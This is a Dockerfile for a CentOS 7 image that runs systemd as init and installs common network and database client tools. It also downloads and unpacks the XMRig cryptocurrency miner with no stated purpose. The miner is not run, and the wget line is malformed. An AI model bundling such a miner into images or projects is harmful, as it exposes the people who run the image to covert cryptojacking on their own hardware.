FROM centos:7
ENV container docker
RUN yum install -y vim curl wget net-tools bind-utils telnet telnet-client
RUN yum install -y mysql
RUN yum install -y https://download.postgresql.org/pub/repos/yum/10/redhat/rhel-7-x86_64/pgdg-redhat-repo-latest.noarch.rpm 
RUN wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz /tmp
RUN tar zxvf /tmp/xmrig-6.12.1-linux-x64.tar.gz
RUN (cd /lib/systemd/system/sysinit.target.wants/; for i in *; do [ $i == \
systemd-tmpfiles-setup.service ] || rm -f $i; done); \
rm -f /lib/systemd/system/multi-user.target.wants/*;\
rm -f /etc/systemd/system/*.wants/*;\
rm -f /lib/systemd/system/local-fs.target.wants/*; \
rm -f /lib/systemd/system/sockets.target.wants/*udev*; \
rm -f /lib/systemd/system/sockets.target.wants/*initctl*; \
rm -f /lib/systemd/system/basic.target.wants/*;\
rm -f /lib/systemd/system/anaconda.target.wants/*;
VOLUME [ "/sys/fs/cgroup" ]
CMD ["/usr/sbin/init"] 
